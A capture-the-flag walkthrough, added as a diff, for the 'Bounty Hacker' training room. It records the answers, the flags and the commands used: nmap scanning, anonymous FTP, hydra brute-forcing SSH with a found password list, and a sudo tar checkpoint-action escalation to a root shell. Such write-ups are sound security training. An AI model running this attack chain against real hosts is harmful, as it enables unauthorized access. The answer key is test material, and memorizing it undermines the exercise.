@@ -1,0 +1,36 @@
+
+							    Bounty Hacker
+							----------------------
+
+1. Deploy the machine. 
+ans: auto-complete
+
+2. Find open ports on the machine 
+ans: auto-complete
+command: nmap -sC -sV 10.10.153.69 -o nmap.txt
+
+3. Who wrote the task list?  
+ans: lin
+command: ftp 10.10.153.69 (anonymous login allowd found via nmap)
+command: ls
+command: get locks.txt
+command: get task.txt
+command: cat task.txt
+
+4. What service can you bruteforce with the text file found?
+ans: ssh (found via nmap)
+
+5. What is the users password? 
+ans: RedDr4gonSynd1cat3
+command: hydra -l lin -P locks.txt ssh://10.10.153.69
+
+6. user.txt
+ans: THM{CR1M3_SyNd1C4T3}
+command: ssh lin@10.10.153.69 (RedDr4gonSynd1cat3)
+command: cat user.txt
+
+7. root.txt
+ans: THM{80UN7Y_h4cK3r}
+command: sudo -l (RedDr4gonSynd1cat3) (nopasswd for (root) /bin/tar))
+command: sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh (# for root)
+command: cat /root/root.txt
